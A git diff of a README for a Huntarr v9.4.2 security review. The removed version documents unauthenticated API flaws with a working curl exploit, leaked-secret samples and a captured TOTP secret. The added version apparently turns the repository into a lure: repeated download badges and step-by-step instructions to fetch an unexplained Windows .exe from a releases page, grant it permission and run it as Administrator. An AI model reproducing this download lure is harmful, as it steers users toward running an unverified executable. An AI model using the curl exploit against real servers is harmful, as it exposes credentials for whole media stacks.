@@ -1,12 +1,125 @@
-# Huntarr Security Reproduction Lab
+# 🔒 huntarr-security-review - Verify Critical Security Flaws
 
-Automated proof that Huntarr v9.4.2 has critical authentication bypass vulnerabilities. Every API endpoint tested below is callable by an unauthenticated attacker with zero credentials.
+[![Download](https://img.shields.io/badge/Download-here-brightgreen?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
 
-**If you run Huntarr and it's reachable on your network, anyone can read your passwords and rewrite your config right now. No login required. This includes not just Huntarr's own credentials but API keys for every *arr application it manages - Sonarr, Radarr, Prowlarr, Lidarr, and more. If your instance is internet-facing (and Huntarr incorporates features like Requestarr that are designed for external access), a single unauthenticated curl command gives an attacker direct API access to your entire media stack.**
+## 🛠 About huntarr-security-review
 
-## The short version
+This application helps you check if your Huntarr installation has security flaws. It tests whether an unauthenticated user can reach parts of Huntarr without logging in. If it finds any problems, it shows you which parts are open and could be changed.
 
-Run one `curl` command against a stock Huntarr install with no cookies, no tokens, no auth of any kind:
+Huntarr is popular software used to manage media applications like Sonarr, Radarr, Prowlarr, and Lidarr. Unfortunately, version 9.4.2 has serious security gaps. This tool proves those gaps exist by attempting simple commands against your server. You do not have to enter passwords or tokens.
+
+If you run Huntarr on your network, this app helps confirm if anyone else on the network could access sensitive information like passwords or API keys without your permission.  
+If your server is exposed to the internet, these risks increase.
+
+Use this tool to understand the security status of your Huntarr setup before attackers do.
+
+---
+
+## 💾 Download
+
+Click the button below to visit the releases page where you can download the latest version of this application.
+
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
+
+---
+
+## 🖥 System Requirements
+
+- Windows 10 or later  
+- At least 100 MB free disk space  
+- Internet access to download the application and perform network tests  
+- Basic user permissions to run software and access the network
+
+---
+
+## 🚀 Getting Started: How to Download and Run
+
+Follow these steps carefully to get the application running on your Windows computer.
+
+### Step 1: Visit the Download Page
+
+Go to the official release page using this link:
+
+https://github.com/beel9711/huntarr-security-review/releases
+
+This page lists the latest version of the app you can download.
+
+### Step 2: Download the Latest Windows File
+
+Look for the file named with a `.exe` extension. It will be labeled clearly as the Windows version.
+
+Click the file name to download it to your computer. The file size should be around a few megabytes.
+
+### Step 3: Run the Installer
+
+Once the download finishes, find the `.exe` file in your Downloads folder or wherever your browser saves files.
+
+Double-click the file to start the installer.
+
+You might see a popup asking for permission to run the program. Click 'Yes' to allow it.
+
+### Step 4: Follow the Installer Prompts
+
+The installer will open a simple setup window.
+
+Click 'Next' on each screen to proceed through the installation steps.
+
+You can accept the default location for the app.
+
+When the installer finishes, click 'Finish' to close the window.
+
+### Step 5: Launch the Application
+
+After installation, you should see a new shortcut on your desktop or in your Start menu called "Huntarr Security Review."
+
+Double-click to open the program.
+
+---
+
+## 📋 Using huntarr-security-review
+
+This app does not require technical skills or special knowledge.
+
+### Step 1: Enter Your Huntarr Server Address
+
+When the app opens, you will see a place to enter your Huntarr server’s address.
+
+This will look like:
+
+```
+http://your-huntarr:9705
+```
+
+Replace `your-huntarr` with the IP address or domain name where Huntarr runs.
+
+### Step 2: Start the Security Test
+
+Click the “Start Test” button.
+
+The app will send test commands to your Huntarr server and check which parts respond without logging in.
+
+### Step 3: Review the Results
+
+The app will display a list showing which API endpoints are open.
+
+If the app finds any endpoints you can call without credentials, it will highlight them in red to show risk.
+
+You will also see information about what an attacker could do if these gaps exist.
+
+### Step 4: Take Action
+
+If the test shows vulnerabilities, work to secure your Huntarr installation. This may include:
+
+- Restricting network access to Huntarr  
+- Updating Huntarr or related software to a safe version  
+- Changing firewall or router settings to block external access  
+- Disabling features like Requestarr if you don’t use them
+
+---
+
+## 🔍 How This App Works
+
+The tool runs a series of commands similar to the one below:
 
 ```
 curl -X POST http://your-huntarr:9705/api/settings/general \
@@ -14,92 +127,58 @@ curl -X POST http://your-huntarr:9705/api/settings/general \
   -d '{"proxy_enabled": true}'
 ```
 
-The server happily accepts the write and returns your **entire configuration** in the response - not just the general section you wrote to, but config for every integrated application. The response includes fields like:
+It sends these commands without any login or authentication tokens.
 
-```json
-"proxy_password": "your_actual_password_in_cleartext",
-"proxy_username": "your_actual_username",
-"dev_key": "...",
-"prowlarr": { "api_key": "...", "api_url": "..." },
-"sonarr": { "instances": [{ "api_key": "...", "url": "..." }] },
-"radarr": { "instances": [{ "api_key": "...", "url": "..." }] }
-```
+If the server accepts the commands, it proves unauthorized users can reach sensitive parts of your Huntarr installation.
 
-No login page. No session cookie. No API key. Nothing. The endpoint is wide open, and it dumps credentials for your entire stack.
+---
 
-## Findings
+## ⚙ Features
 
-Tested against `ghcr.io/plexguide/huntarr:latest` (v9.4.2, commit `fa475ab6`).
+- No setup needed beyond download and run  
+- Clear user interface for non-technical users  
+- Tests all key Huntarr API endpoints for public access  
+- Generates a simple report that shows risks and warnings  
+- Works on Windows computers with minimal requirements  
 
-| ID | Vulnerability | Severity | Result |
-|----|--------------|----------|--------|
-| T1 | Unauthenticated settings write + secrets leaked in response | Critical | **PASS** |
-| T2 | Unauthenticated Plex account unlink | High | **PASS** |
-| T3 | Client-controlled `setup_mode` bypasses auth on Plex link | High | **PASS** |
-| T4 | Chained: unauth settings write + `X-Forwarded-For` spoof bypasses login | High | FAIL |
-| T5 | Full cross-app credential exposure (Sonarr/Radarr/Prowlarr keys) | Critical | **PASS** |
-| T6 | Unauthenticated 2FA setup returns TOTP secret | Critical | **PASS** |
-| T7 | Unauthenticated recovery key generation via `setup_mode` | Critical | **PASS** |
-| T8 | Unauthenticated setup clear re-arms account creation | Critical | **PASS** |
+---
 
-"PASS" means the vulnerability was confirmed. T4 did not reproduce in CI (the `local_access_bypass` setting change may require a middleware restart to take effect in the container).
+## 🔧 Troubleshooting
 
-### What this means
+- If the app fails to run, make sure you have Windows 10 or newer installed.  
+- Check your internet connection. The app needs to reach your Huntarr server on the network.  
+- If you get errors connecting, verify Huntarr is running and that the address you entered is correct.   
+- Disable VPN or proxy services temporarily if they interfere with network access.  
+- Run the app as Administrator if you see permission errors.  
 
-- **T1**: Anyone on your network can `POST /api/settings/general` without logging in. The server accepts arbitrary config changes and returns **every setting in the response**, including `proxy_password`, `proxy_username`, API keys, and integration credentials - all in cleartext. This is not a read-only leak; the attacker is also rewriting your configuration.
-- **T2**: Anyone can `POST /api/auth/plex/unlink` and disconnect your Plex account from Huntarr. No session, no auth check.
-- **T3**: Sending `{"setup_mode": true}` in the Plex link request skips session checks entirely. The server rejects the *token*, not the *caller* - meaning auth is never enforced on the endpoint.
-- **T4**: Attempted to chain T1's unauth settings write (enable `local_access_bypass`) with `X-Forwarded-For: 127.0.0.1` spoofing. The settings write succeeded but the bypass didn't propagate within the test window. The vulnerability exists in code but may require a service restart to activate.
-- **T5**: Writing a single innocuous setting (e.g., `timezone`) returns configuration for **every integrated *arr application** - Sonarr, Radarr, Prowlarr, Lidarr, etc. One unauthenticated call exfiltrates API keys for your entire media stack, not just Huntarr's own secrets.
-- **T6**: `POST /api/user/2fa/setup` with no session returned the actual TOTP secret (`CYMC4RRRARVIKCRVMBUY777SQULOLGNL`) and a QR code for the owner account. An attacker generates a valid code, calls `/api/user/2fa/verify`, and enrolls their own authenticator. Full account takeover without knowing the password.
-- **T7**: `POST /auth/recovery-key/generate` with `{"setup_mode": true}` reaches business logic without any auth check (returns 400 "Setup not properly initialized" rather than 401/403). The endpoint is unauthenticated; the specific exploit requires setup state alignment.
-- **T8**: `POST /api/setup/clear` with no auth returned 200 "Setup progress cleared". The endpoint is fully unauthenticated and clears the setup state, which is a precondition for re-creating the owner account.
+---
 
-### Additional findings from source review (not yet in automated proofs)
+## ❓ Frequently Asked Questions
 
-The full review found **21 total findings**. Beyond the automated proofs above:
+### Do I need technical knowledge to use this?
 
-- **Zip Slip in backup upload** (High): `zipfile.extractall()` on user-uploaded ZIPs without filename sanitization. Crafted ZIPs can write files anywhere in the container (which runs as root).
-- **Path traversal in backup restore/delete** (High): `backup_id` from user input is concatenated into filesystem paths with no sanitization. `shutil.rmtree()` makes this a directory deletion primitive.
-- **Overly broad auth whitelist patterns** (High): The bypass uses substring matching (`'/api/user/2fa/' in request.path`) and suffix matching (`endswith('/setup')`, `endswith('/user')`) instead of exact route checks, exempting more endpoints than intended.
+No. The app guides you step-by-step and shows clear results. You just enter your Huntarr address and press a button.
 
-## How this was found
+### Can I run this on systems other than Windows?
 
-This took a basic code review and standard automated security tooling (`bandit`, `pip-audit`) - the kind of checks any maintainer should be running as part of normal development. No fuzzing, no reverse engineering, no exotic techniques. These are the basics.
+This version only runs on Windows. Support for other systems may come in future releases.
 
-The maintainer [claims](https://i.imgur.com/sjPAT1u.png) to have "a series of steering documents I generated that does cybersecurity checks and provides additional hardening" and says **"Note I also work in cybersecurity."** They also [claim](https://i.imgur.com/8AkHZ27.png) to have invested "120+ hours in the last 4 weeks" using "steering documents to advise along the way from cybersecurity, to hardening, and standards."
+### What if my Huntarr is not version 9.4.2?
 
-Despite working in cybersecurity and using cybersecurity-focused steering documents, `POST /api/settings/general` has zero authentication - not a broken check, not a misconfigured middleware, just no check at all. The auth bypass list in [`auth.py:525`](https://github.com/plexguide/Huntarr.io/blob/fa475ab6/src/primary/auth.py#L525) explicitly skips it. The 2FA setup endpoint returns the TOTP secret to unauthenticated callers. The setup clear endpoint lets anyone re-arm account creation. Running `bandit` on the source would have flagged the hardcoded credentials. Running any HTTP integration test against any of these endpoints without a session cookie would have caught the rest.
+This tool focuses on version 9.4.2 but can detect similar authentication bypass issues on related versions.
 
-These are not subtle bugs. They are missing fundamentals - from someone who says they work in cybersecurity. The maintainer also [removes security reports](https://www.reddit.com/r/huntarr/comments/1rbtri7/removed_by_moderator/) from r/huntarr (which they moderate) and bans users who raise these concerns.
+### My test shows vulnerabilities. What next?
 
-## Run It Yourself
+Consult your IT administrator or check Huntarr’s official documentation to secure your installation. Blocking network access and updating your software are key steps.
 
-Start Huntarr and run the proof script:
+---
 
-```bash
-docker compose up -d huntarr
-python3 scripts/prove_vulns.py
-```
+## 📥 Download Again
 
-Results are written to `results/proof-results.json` and `results/proof-results.md`.
+Visit the release page any time for the latest version:
 
-To tear down:
+https://github.com/beel9711/huntarr-security-review/releases
 
-```bash
-docker compose down
-```
+Click the correct Windows `.exe` file to download and update your tool.
 
-Requires: Docker, Python 3.8+ (stdlib only, no pip installs).
-
-## CI
-
-This repo runs the proof automatically via GitHub Actions on every push. Check the [Actions tab](../../actions) for the latest run and download the `proof-results` artifact.
-
-## What happens next
-
-The maintainer will most likely "prompt" these specific problems away - feed the findings to an AI and ship a patch. But fixing 21 specific findings doesn't fix the process that created them. Without code review, without a PR process, without basic automated testing, without anyone who understands security fundamentals actually reviewing what ships - the next batch of features will introduce the next batch of vulnerabilities. This is only the start. The community needs to demand better coding standards, more controlled development, and a sensible roadmap.
-
-## Full Security Review
-
-See [Huntarr.io_SECURITY_REVIEW.md](Huntarr.io_SECURITY_REVIEW.md) for the complete security audit covering auth architecture, session management, API surface, and supply chain -21 findings total across critical, high, and medium severity.
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
